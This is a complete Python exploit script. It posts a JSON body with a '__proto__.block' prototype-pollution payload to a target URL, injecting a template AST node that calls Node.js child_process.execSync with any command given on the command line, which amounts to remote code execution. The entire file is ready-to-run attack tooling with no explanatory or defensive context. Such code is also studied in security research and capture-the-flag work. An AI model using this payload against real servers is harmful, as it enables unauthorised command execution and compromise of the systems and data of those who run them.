from typing import Dict, Any

import argparse
import json
import requests
from pwn import *

def _construct_data(json_data: str, command: str) -> Dict[str, Any]:
    data = json.loads(json_data)

    return dict({
        "__proto__.block": {
            "type": "Text", 
            "line": f"process.mainModule.require('child_process').execSync(`{command}`)"
        }
    }, **data)

def _run(url: str, command: str, json_data: str) -> str:
    data = json.dumps(_construct_data(json_data, command))

    return requests.post(
        url,
        data=data,
        headers={
            "Content-Type": "application/json",
        }
    ).text

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--command", required=True)
    parser.add_argument("-u", "--url", type=str, required=True)
    parser.add_argument("-d", "--data", type=str, help="any data that must be present in the request", default="{}")

    args = parser.parse_args()
    print(_run(args.url, args.command, args.data))